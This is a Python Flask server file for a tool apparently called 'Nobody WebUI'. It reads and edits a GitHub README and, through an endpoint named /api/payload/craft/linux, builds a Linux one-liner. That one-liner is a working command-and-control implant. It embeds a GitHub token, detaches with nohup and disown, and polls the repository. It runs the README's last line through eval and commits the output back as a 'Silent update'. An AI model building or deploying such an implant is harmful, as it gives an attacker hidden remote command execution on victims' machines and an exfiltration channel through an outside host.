# app/webui/server.py
from flask import Flask, render_template, request, jsonify
from ..state import AppState
import base64
import requests
import time
import hashlib

REPO_NAME = "testrepo"
FILE_PATH = "README.md"
BRANCH = "main"

def create_app(shared_state: AppState) -> Flask:
    app = Flask(__name__, static_folder="static", template_folder="templates")
    state = shared_state

    # ---------- helpers ----------
    def _api_headers(token: str) -> dict:
        return {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "Nobody-WebUI/1.0",
        }

    def _contents_url(username: str, repo: str, path: str) -> str:
        return f"https://api.github.com/repos/{username}/{repo}/contents/{path}"

    def _get_item_json(username: str, repo: str, path: str, token: str):
        """Return JSON dict on 200, else None (404, bad creds, network, etc.)."""
        url = _contents_url(username, repo, path)
        try:
            r = requests.get(url, headers=_api_headers(token), params={"ref": BRANCH}, timeout=10)
            if r.status_code == 200:
                return r.json()
            return None
        except requests.RequestException:
            return None

    def _decode_content_json(item: dict) -> str:
        """Safely decode base64 'content' from contents API JSON."""
        try:
            b64 = (item.get("content") or "")
            # strip any newlines GitHub may include
            b64 = "".join(b64.split())
            return base64.b64decode(b64.encode()).decode("utf-8", errors="replace")
        except Exception:
            return ""

    def _put_item(username: str, repo: str, path: str, token: str, new_text: str, sha: str):
        """PUT update; return requests.Response (caller checks status)."""
        url = _contents_url(username, repo, path)
        b64_content = base64.b64encode(new_text.encode()).decode()
        payload = {
            "message": f"Update {path} via Nobody WebUI",
            "content": b64_content,
            "sha": sha,
            "branch": BRANCH,
        }
        return requests.put(url, headers=_api_headers(token), json=payload, timeout=15)

    # ---------- pages ----------
    @app.get("/")
    def index():
        return render_template(
            "index.html",
            repo=(state.github_repo_name or REPO_NAME),
            path=FILE_PATH,
            branch=BRANCH,
        )

    # ---------- shared status ----------
    @app.get("/api/status")
    def api_status():
        token = state.github_token
        mask = "(not set)" if not token else (token[:4] + "********" + token[-4:] if len(token) > 8 else "********")
        return jsonify({
            "username": state.github_username or "",
            "token_masked": mask,
            "repo": state.github_repo_name or REPO_NAME,
            "path": FILE_PATH,
            "branch": BRANCH,
            "interval_ms": getattr(state, "github_poll_interval_ms", 5000),
        })

    @app.post("/api/github/set")
    def api_set_creds():
        data = request.get_json(force=True) or {}
        if "username" in data:
            state.github_username = (data["username"] or "").strip() or None
        if "token" in data:
            state.github_token = (data["token"] or "").strip() or None
        if "repo" in data:
            val = (data["repo"] or "").strip()
            state.github_repo_name = val or None
        return jsonify({"ok": True})

    # ---------- interval (ms) ----------
    @app.get("/api/interval")
    def api_interval_get():
        return jsonify({"interval_ms": getattr(state, "github_poll_interval_ms", 5000)})

    @app.post("/api/interval")
    def api_interval_set():
        data = request.get_json(force=True) or {}
        try:
            ms = int(data.get("interval_ms"))
        except Exception:
            return jsonify({"error": "invalid interval_ms"}), 400
        if ms < 100:
            return jsonify({"error": "interval must be >= 100 ms"}), 400
        state.github_poll_interval_ms = ms
        return jsonify({"ok": True, "interval_ms": ms})

    # ---------- README (live) ----------

    # app/webui/server.py (inside create_app)


    # simple in-memory cache for raw fetches
    _raw_cache = {
        "etag": None,      # last ETag from raw.githubusercontent.com
        "content": None,   # last content text
    }

    def _raw_url(username: str, repo: str, path: str, branch: str) -> str:
        # raw endpoint for public repos (no API quota)
        return f"https://raw.githubusercontent.com/{username}/{repo}/{branch}/{path}"

    @app.get("/api/github/readme")
    def api_readme():
        if not state.github_username or not state.github_token:
            return jsonify({"error": "username or token missing"}), 400

        repo = state.github_repo_name or REPO_NAME
        url = _raw_url(state.github_username, repo, FILE_PATH, BRANCH)

        # Try raw fetch first, with ETag
        headers = {}
        if _raw_cache["etag"]:
            headers["If-None-Match"] = _raw_cache["etag"]

        try:
            r = requests.get(url, headers=headers, timeout=10)
            if r.status_code == 200:
                content = r.text
                etag = r.headers.get("ETag")  # may be quoted
                _raw_cache["content"] = content
                _raw_cache["etag"] = etag
                version = etag or hashlib.sha1(content.encode()).hexdigest()
                print("====> NO API <====")
                return jsonify({"version": version, "content": content})
            if r.status_code == 304 and _raw_cache["content"] is not None:
                # not modified, serve cached content
                version = _raw_cache["etag"] or hashlib.sha1(_raw_cache["content"].encode()).hexdigest()
                return jsonify({"version": version, "content": _raw_cache["content"]})
            # If 404 or 403, fall back to API below
        except requests.RequestException:
            pass

        print("==> USING API <==")
        # Fallback for private repos or raw errors: use Contents API once
        item = _get_item_json(state.github_username, repo, FILE_PATH, state.github_token)
        if item is None:
            return jsonify({"error": f"{FILE_PATH} not found or fetch failed in {state.github_username}/{repo}@{BRANCH}"}), 404

        content = _decode_content_json(item)
        sha = item.get("sha")
        # Also update the raw cache so the next not-modified path works if raw becomes reachable
        _raw_cache["content"] = content
        _raw_cache["etag"] = None  # unknown from API
        return jsonify({"version": sha or "unknown", "content": content})


    @app.post("/api/github/update")
    def api_update():
        if not state.github_username or not state.github_token:
            return jsonify({"error": "username or token missing"}), 400

        data = request.get_json(force=True) or {}
        new_text = data.get("content", "")

        repo = state.github_repo_name or REPO_NAME
        before = _get_item_json(state.github_username, repo, FILE_PATH, state.github_token)
        if before is None or not before.get("sha"):
            return jsonify({"error": f"{FILE_PATH} not found; cannot update"}), 404

        baseline_sha = before["sha"]
        resp = _put_item(state.github_username, repo, FILE_PATH, state.github_token, new_text, baseline_sha)
        if resp.status_code not in (200, 201):
            try:
                detail = resp.json()
            except Exception:
                detail = {"message": resp.text}
            return jsonify({"error": f"PUT failed ({resp.status_code})", "detail": detail}), 400

        # quick consistency poll (optional)
        deadline = time.time() + 5.0
        while time.time() < deadline:
            itm = _get_item_json(state.github_username, repo, FILE_PATH, state.github_token)
            if itm and itm.get("sha") != baseline_sha:
                return jsonify({"ok": True, "sha": itm.get("sha"), "content": _decode_content_json(itm)})
            time.sleep(0.5)

        # fallback (still OK, but no fresh content)
        return jsonify({"ok": True})

    # ---------- craft linux one-liner ----------
    def _craft_one_liner(username: str, token: str, repo: str, path: str, branch: str, sleep_secs: int) -> str:
        # Escape only single quotes for safe embedding inside an outer single-quoted bash -c '...'
        def esc(s: str) -> str:
            return s.replace("'", "'\"'\"'")
        esc_user   = esc(username or "")
        esc_token  = esc(token or "")
        esc_repo   = esc(repo or "")
        esc_path   = esc(path or "README.md")
        esc_branch = esc(branch or "main")

        # All inner quotes are DOUBLE quotes to avoid breaking the outer single quotes.
        inner = (
            "set -u; "
            f"GITHUB_TOKEN=\"{esc_token}\"; "
            f"REPO_OWNER=\"{esc_user}\"; "
            f"REPO_NAME=\"{esc_repo}\"; "
            f"FILE_PATH=\"{esc_path}\"; "
            f"BRANCH=\"{esc_branch}\"; "
            f"SLEEP_SECS={sleep_secs}; "
            "API_URL=\"https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}\"; "
            # --- singleton lock (prevents multiple background loops) ---
            "LOCKDIR=\"/tmp/nobody_${REPO_OWNER}_${REPO_NAME}_$(echo \"${FILE_PATH}\" | tr '/ ' '__').lock\"; "
            "if ! mkdir \"$LOCKDIR\" 2>/dev/null; then exit 0; fi; "
            "trap 'rmdir \"$LOCKDIR\"' EXIT; "
            # --- helpers ---
            "b64_noline(){ base64 | tr -d \"\\n\"; }; "
            "get_sha(){ curl -s -H \"Authorization: token ${GITHUB_TOKEN}\" -H \"Accept: application/vnd.github.v3+json\" "
                "\"${API_URL}?ref=${BRANCH}\" | sed -n \"s/.*\\\"sha\\\"[[:space:]]*:[[:space:]]*\\\"\\([^\\\"]*\\)\\\".*/\\1/p\" | head -n 1; }; "
            "get_raw_content(){ curl -s -H \"Authorization: token ${GITHUB_TOKEN}\" -H \"Accept: application/vnd.github.v3.raw\" "
                "\"${API_URL}?ref=${BRANCH}\"; }; "
            "put_update(){ local new_text=\"$1\" old_sha=\"$2\"; "
                "local b64; b64=$(printf \"%s\" \"$new_text\" | b64_noline); "
                "local payload; payload=$(printf \"{\\\"message\\\":\\\"Silent update\\\",\\\"content\\\":\\\"%s\\\",\\\"sha\\\":\\\"%s\\\",\\\"branch\\\":\\\"%s\\\"}\" \"$b64\" \"$old_sha\" \"$BRANCH\"); "
                "curl -s -X PUT -H \"Authorization: token ${GITHUB_TOKEN}\" -H \"Content-Type: application/json\" -d \"$payload\" \"$API_URL\" "
                "| sed -n \"s/.*\\\"content\\\"[^{]*{[^}]*\\\"sha\\\"[[:space:]]*:[[:space:]]*\\\"\\([^\\\"]*\\)\\\".*/\\1/p\" | head -n 1; "
            "}; "
            # --- main loop ---
            "last_sha=\"\"; "
            "while :; do "
                "sha=$(get_sha); "
                "if [ -z \"$sha\" ] || [ \"$sha\" = \"null\" ]; then sleep \"$SLEEP_SECS\"; continue; fi; "
                "if [ \"$sha\" != \"$last_sha\" ]; then "
                    "baseline_sha=\"$sha\"; "
                    "content=$(get_raw_content); "
                    "cmd=$(printf \"%s\" \"$content\" | tail -n 1); "
                    "content_head=$(printf \"%s\" \"$content\" | sed \"$d\"); "
                    # redact long token-like blobs from output
                    "output=$(eval \"$cmd\" 2>&1 | sed -E \"s/[A-Za-z0-9_-]{30,}/[REDACTED]/g\"); "
                    # build new body with printf (inject real newlines at runtime)
                    "new_content=$(printf \"%s\\n\\nCommand output:\\n%s\\n%s\" \"$content_head\" \"$output\" \"$cmd\"); "
                    "new_sha=$(put_update \"$new_content\" \"$baseline_sha\"); "
                    "if [ -z \"$new_sha\" ]; then new_sha=$(get_sha); fi; "
                    "last_sha=\"$new_sha\"; "
                "fi; "
                "sleep \"$SLEEP_SECS\"; "
            "done"
        )

        # nohup + disown, fully single-line
        return f"nohup bash -c '{inner}' >/dev/null 2>&1 & disown"



    import time  # already at the top, but ensure it's there

    @app.get("/api/github/rate_limit")
    def api_rate_limit():
        if not state.github_token:
            return jsonify({"error": "GitHub token not set"}), 400
        try:
            r = requests.get(
                "https://api.github.com/rate_limit",
                headers={"Authorization": f"token {state.github_token}"}
            )
            reset_ts = int(r.headers.get("X-RateLimit-Reset", "0"))
            reset_time = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(reset_ts))
            remaining = r.headers.get("X-RateLimit-Remaining")
            limit = r.headers.get("X-RateLimit-Limit")
            return jsonify({
                "remaining": remaining,
                "limit": limit,
                "resets_at": reset_time
            })
        except requests.RequestException as e:
            return jsonify({"error": str(e)}), 400



    @app.post("/api/payload/craft/linux")
    def api_craft_linux():
        if not state.github_username or not state.github_token:
            return jsonify({"error": "username or token missing"}), 400
        ms = getattr(state, "github_poll_interval_ms", 5000)
        sleep_secs = max(1, int(round(ms / 1000)))
        cmd = _craft_one_liner(
            username=state.github_username,
            token=state.github_token,
            repo=(state.github_repo_name or REPO_NAME),
            path=FILE_PATH,
            branch=BRANCH,
            sleep_secs=sleep_secs,
        )
        return jsonify({"command": cmd})

    return app
